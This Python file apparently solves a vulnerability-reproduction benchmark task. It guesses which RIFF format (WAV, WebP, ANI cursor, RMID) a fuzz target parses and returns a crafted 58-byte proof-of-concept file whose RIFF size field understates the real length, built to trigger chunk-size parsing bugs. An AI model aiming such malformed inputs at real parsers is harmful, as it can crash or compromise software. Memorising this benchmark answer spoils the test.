import os
import tarfile
import struct
from typing import Dict, Iterable, List, Optional, Tuple


def _is_text_source(name: str) -> bool:
    n = name.lower()
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".rs", ".py", ".java", ".kt", ".go")
    if n.endswith(exts):
        return True
    if "fuzz" in n or "fuzzer" in n:
        if any(n.endswith(e) for e in (".txt", ".md", ".cmake", "cmakelists.txt", ".gn", ".gni", ".bazel", "build", ".mk")):
            return True
    return False


def _iter_sources_from_dir(root: str, max_files: int, max_total_bytes: int, per_file_bytes: int) -> Iterable[Tuple[str, bytes]]:
    total = 0
    count = 0
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if count >= max_files or total >= max_total_bytes:
                return
            path = os.path.join(dirpath, fn)
            rel = os.path.relpath(path, root)
            if not _is_text_source(rel):
                continue
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0:
                continue
            to_read = min(st.st_size, per_file_bytes, max_total_bytes - total)
            if to_read <= 0:
                return
            try:
                with open(path, "rb") as f:
                    data = f.read(to_read)
            except OSError:
                continue
            total += len(data)
            count += 1
            yield rel, data


def _iter_sources_from_tar(tar_path: str, max_files: int, max_total_bytes: int, per_file_bytes: int) -> Iterable[Tuple[str, bytes]]:
    total = 0
    count = 0
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            members.sort(key=lambda m: (("fuzz" not in (m.name or "").lower() and "fuzzer" not in (m.name or "").lower()), m.size if hasattr(m, "size") else 0))
            for m in members:
                if count >= max_files or total >= max_total_bytes:
                    return
                if not m.isfile():
                    continue
                name = m.name or ""
                if not _is_text_source(name):
                    continue
                size = getattr(m, "size", 0) or 0
                if size <= 0:
                    continue
                to_read = min(size, per_file_bytes, max_total_bytes - total)
                if to_read <= 0:
                    return
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(to_read)
                except Exception:
                    continue
                total += len(data)
                count += 1
                yield name, data
    except Exception:
        return


def _iter_sources(src_path: str, max_files: int = 2500, max_total_bytes: int = 16 * 1024 * 1024, per_file_bytes: int = 256 * 1024) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_sources_from_dir(src_path, max_files=max_files, max_total_bytes=max_total_bytes, per_file_bytes=per_file_bytes)
        return
    yield from _iter_sources_from_tar(src_path, max_files=max_files, max_total_bytes=max_total_bytes, per_file_bytes=per_file_bytes)


def _detect_riff_form(src_path: str) -> str:
    token_weights: Dict[str, int] = {
        "webp": 10,
        "vp8x": 8,
        "vp8l": 8,
        "vp8 ": 6,
        "webpdecode": 8,
        "webpdemux": 8,
        "webpmux": 8,
        "wave": 8,
        "wav": 3,
        "fmt ": 6,
        "data": 1,
        "drwav": 10,
        "sndfile": 10,
        "acon": 10,
        "anih": 10,
        ".ani": 6,
        "rmid": 10,
        "midi": 5,
        "avi ": 7,
        "avih": 7,
        "riff": 1,
    }

    candidates: Dict[str, List[str]] = {
        "WEBP": ["webp", "vp8x", "vp8l", "vp8 ", "webpdecode", "webpdemux", "webpmux"],
        "WAVE": ["wave", "drwav", "sndfile", "fmt ", "wav"],
        "ACON": ["acon", "anih", ".ani"],
        "RMID": ["rmid", "midi"],
        "AVI ": ["avi ", "avih", "movi"],
    }

    scores: Dict[str, int] = {k: 0 for k in candidates}

    for name, data in _iter_sources(src_path):
        try:
            text = data.decode("latin-1", errors="ignore").lower()
        except Exception:
            continue

        # Prefer fuzzer harness files by giving them more influence.
        boost = 2 if ("llvmfuzzertestoneinput" in text or "fuzz" in name.lower() or "fuzzer" in name.lower()) else 1

        for form, toks in candidates.items():
            s = 0
            for t in toks:
                c = text.count(t)
                if c:
                    s += c * token_weights.get(t, 1)
            scores[form] += s * boost

    best_form = max(scores.items(), key=lambda kv: kv[1])[0]
    # If uncertain, default to WAVE (common RIFF parser target).
    if scores.get(best_form, 0) <= 0:
        return "WAVE"
    return best_form


def _build_wav_poc() -> bytes:
    riff_size = 40  # smaller than actual (58-8=50), so RIFF ends early
    sample_rate = 8000
    num_channels = 1
    bits_per_sample = 16
    block_align = num_channels * (bits_per_sample // 8)
    byte_rate = sample_rate * block_align

    fmt_data = struct.pack("<HHIIHH", 1, num_channels, sample_rate, byte_rate, block_align, bits_per_sample)
    fmt_chunk = b"fmt " + struct.pack("<I", len(fmt_data)) + fmt_data

    data_payload = b"A" * 14
    data_chunk = b"data" + struct.pack("<I", len(data_payload)) + data_payload

    poc = b"RIFF" + struct.pack("<I", riff_size) + b"WAVE" + fmt_chunk + data_chunk
    return poc


def _build_webp_poc() -> bytes:
    riff_size = 40  # smaller than actual (58-8=50)
    # Minimal-looking VP8 chunk payload; validity is not required for triggering chunk-size parsing bugs.
    vp8_payload = b"\x9d\x01\x2a" + b"\x00" * 11  # 14 bytes total
    vp8_chunk = b"VP8 " + struct.pack("<I", len(vp8_payload)) + vp8_payload

    exif_payload = b"E" * 16
    exif_chunk = b"EXIF" + struct.pack("<I", len(exif_payload)) + exif_payload

    poc = b"RIFF" + struct.pack("<I", riff_size) + b"WEBP" + vp8_chunk + exif_chunk
    return poc


def _build_acon_poc() -> bytes:
    riff_size = 40  # smaller than actual
    # ANIHEADER is 36 bytes; use zeros to keep it simple.
    anih_payload = b"\x00" * 36
    anih_chunk = b"anih" + struct.pack("<I", len(anih_payload)) + anih_payload
    # Add 2 trailing bytes to match 58 bytes like ground-truth length hint (optional).
    poc = b"RIFF" + struct.pack("<I", riff_size) + b"ACON" + anih_chunk + b"\x00\x00"
    return poc


def _build_rmid_poc() -> bytes:
    riff_size = 40  # smaller than actual
    data_payload = b"MThd" + b"\x00" * 10  # 14 bytes
    data_chunk = b"data" + struct.pack("<I", len(data_payload)) + data_payload
    poc = b"RIFF" + struct.pack("<I", riff_size) + b"RMID" + data_chunk + b"\x00" * 24  # pad to reach 58
    return poc[:58]


class Solution:
    def solve(self, src_path: str) -> bytes:
        form = _detect_riff_form(src_path)
        if form == "WEBP":
            return _build_webp_poc()
        if form == "ACON":
            return _build_acon_poc()
        if form == "RMID":
            return _build_rmid_poc()
        # Default / most likely
        return _build_wav_poc()